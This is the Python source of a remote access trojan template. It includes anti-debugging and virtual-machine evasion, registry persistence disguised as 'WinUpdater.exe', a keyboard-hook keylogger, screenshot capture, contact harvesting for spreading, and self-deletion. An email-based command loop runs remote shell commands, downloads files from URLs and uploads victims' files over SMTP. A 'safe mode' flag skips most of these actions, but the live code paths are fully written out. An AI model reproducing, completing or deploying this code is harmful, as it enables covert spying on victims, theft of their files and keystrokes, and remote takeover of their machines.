# language: Python, file: rat_template.py
import os, sys, json, time, base64, threading, subprocess, socket, platform, random, ctypes
import smtplib, imaplib, email, io, tempfile, shutil, glob
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.policy import default as email_policy

CFG = json.loads("""__CFG__""")
SAFE = bool(CFG.get("safe_mode", True))
MODS = set(CFG.get("modules", []))
HOSTNAME = socket.gethostname()
LOG_FILE = os.path.join(tempfile.gettempdir(), ".log_rat.txt")

def _log(s):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {s}\n")
    except Exception:
        pass

def anti_debug():
    if platform.system() != "Windows": return False
    try:
        k = ctypes.windll.kernel32
        if k.IsDebuggerPresent(): return True
        flag = ctypes.c_int(0)
        k.CheckRemoteDebuggerPresent(k.GetCurrentProcess(), ctypes.byref(flag))
        return bool(flag.value)
    except Exception: return False

def check_vm():
    markers = []
    try:
        import psutil
        names = " ".join(p.name().lower() for p in psutil.process_iter(["name"]))
        for m in ("vboxservice", "vmtoolsd", "vmsrvc", "qemu-ga"):
            if m in names: markers.append(m)
    except Exception: pass
    if platform.system() == "Windows":
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            man = winreg.QueryValueEx(k, "SystemManufacturer")[0].lower()
            for m in ("vmware", "virtualbox", "qemu", "innotek"):
                if m in man: markers.append(m)
        except Exception: pass
    if markers:
        _log(f"VM markers: {markers}")
        if not SAFE: sys.exit(0)

def mod_persistence():
    if SAFE:
        _log("SAFE: persistence skipped"); return
    try:
        appdata = os.getenv("APPDATA") or tempfile.gettempdir()
        dst = os.path.join(appdata, "WinUpdater.exe")
        if os.path.abspath(sys.executable) != os.path.abspath(dst):
            shutil.copy(sys.executable, dst)
        subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdater /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
        _log(f"persistence: {dst}")
    except Exception as e: _log(f"persistence err: {e}")

def mod_keylogger():
    if platform.system() != "Windows": return
    from ctypes import wintypes, windll, WINFUNCTYPE
    user32, kernel32 = windll.user32, windll.kernel32
    log_path = os.path.join(tempfile.gettempdir(), ".kl_test" if SAFE else ".kl")
    def cb(nCode, wParam, lParam):
        if nCode == 0 and wParam in (0x100, 0x104):
            vk = wintypes.KBDLLHOOKSTRUCT.from_address(lParam).vkCode
            with open(log_path, "a", encoding="utf-8") as f: f.write(f"{vk:02x} ")
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    HOOK = WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    hook = user32.SetWindowsHookExA(13, HOOK(cb), kernel32.GetModuleHandleW(None), 0)
    msg = wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg)); user32.DispatchMessageW(ctypes.byref(msg))

def mod_screenshot():
    if SAFE:
        _log("SAFE: screenshot skipped"); return
    try:
        import pyautogui
        buf = io.BytesIO(); pyautogui.screenshot().save(buf, "PNG")
        send(f"[{HOSTNAME}] screenshot", "attached", [("shot.png", buf.getvalue())])
    except Exception as e: _log(f"screenshot err: {e}")

def mod_spread():
    if SAFE:
        _log("SAFE: spread skipped"); return
    contacts = []
    for f in glob.glob(os.path.expanduser("~/.thunderbird/**/abook*.mab"), recursive=True):
        try: contacts += [l for l in open(f, encoding="utf-8", errors="ignore").read().splitlines() if "@" in l]
        except Exception: pass
    _log(f"spread contacts: {len(contacts)}")

def mod_selfdelete():
    if SAFE:
        _log("SAFE: selfdelete skipped"); return
    if platform.system() == "Windows":
        target = os.path.join(tempfile.gettempdir(), "sd_copy.tmp")
        bat = os.path.join(tempfile.gettempdir(), "sd.bat")
        with open(bat, "w") as f: f.write(f'@echo off\r\ntimeout /t 2 >nul\r\ndel "{target}"\r\ndel "%0"\r\n')
        subprocess.Popen(["cmd", "/c", bat], creationflags=0x08000000)

def mod_rdp():
    if SAFE:
        _log("SAFE: rdp skipped"); return
    try:
        import rdp_agent_lib
    except ImportError:
        _log("rdp: lib не упакована"); return
    rdp_agent_lib.run(CFG.get("c2_host", "127.0.0.1"), int(CFG.get("c2_port", 5555)))

def _smtp():
    s = smtplib.SMTP(CFG["smtp_host"], int(CFG["smtp_port"]), timeout=30)
    s.ehlo(); s.starttls(); s.ehlo()
    s.login(CFG["smtp_user"], CFG["smtp_pass"])
    return s

def send(subject, body, attachments=None):
    if SAFE:
        _log(f"SAFE: would send '{subject}' -> {CFG.get('mail_to')}"); return
    msg = MIMEMultipart(policy=email_policy)
    msg["From"] = CFG["smtp_user"]
    msg["To"] = CFG["mail_to"]
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain", "utf-8"))
    for name, data in (attachments or []):
        p = MIMEApplication(data)
        p.add_header("Content-Disposition", "attachment", filename=name)
        msg.attach(p)
    try:
        with _smtp() as s: s.send_message(msg)
    except Exception as e:
        _log(f"send mail err: {e}")

def recv_commands():
    try:
        host = "imap.gmail.com" if "gmail" in CFG["smtp_host"] else "imap.mail.me.com"
        m = imaplib.IMAP4_SSL(host)
        m.login(CFG["smtp_user"], CFG["smtp_pass"])
        m.select("INBOX")
        _, data = m.search(None, "UNSEEN")
        cmds = []
        for num in data[0].split():
            _, msg_data = m.fetch(num, "(RFC822)")
            msg = email.message_from_bytes(msg_data[0][1])
            body = ""
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_payload(decode=True).decode(errors="ignore"); break
            else:
                body = msg.get_payload(decode=True).decode(errors="ignore")
            m.store(num, "+FLAGS", "\\Seen")
            try: cmds.append(json.loads(body))
            except Exception: pass
        m.logout()
        return cmds
    except Exception: return []

def main():
    if anti_debug():
        _log("debugger detected")
        if not SAFE: sys.exit(0)
    check_vm()
    if not SAFE: time.sleep(random.randint(30, 120))
    
    if "persistence" in MODS: mod_persistence()
    if "keylogger" in MODS: threading.Thread(target=mod_keylogger, daemon=True).start()
    if "spread" in MODS: mod_spread()
    if "screenshot" in MODS: mod_screenshot()
    if "selfdelete" in MODS: mod_selfdelete()
    if "rdp" in MODS: threading.Thread(target=mod_rdp, daemon=True).start()

    _log(f"started safe={SAFE} mods={sorted(MODS)}")
    send(f"[{HOSTNAME}] {'SAFE heartbeat' if SAFE else 'online'}", f"platform={platform.platform()}")

    while True:
        if not SAFE:
            for cmd in recv_commands():
                t = cmd.get("type")
                try:
                    if t == "shell":
                        r = subprocess.run(cmd["cmd"], shell=True, capture_output=True, text=True, timeout=120)
                        send(f"[{HOSTNAME}] shell", r.stdout + r.stderr)
                    elif t == "screenshot": mod_screenshot()
                    elif t == "download":
                        import urllib.request
                        urllib.request.urlretrieve(cmd["url"], cmd["path"])
                        send(f"[{HOSTNAME}] dl", f"saved {cmd['path']}")
                    elif t == "upload":
                        with open(cmd["path"], "rb") as f: data = f.read()
                        send(f"[{HOSTNAME}] upload", "attached", [(os.path.basename(cmd["path"]), data)])
                except Exception as e: _log(f"cmd err: {e}")
        time.sleep(30)

if __name__ == "__main__":
    main()
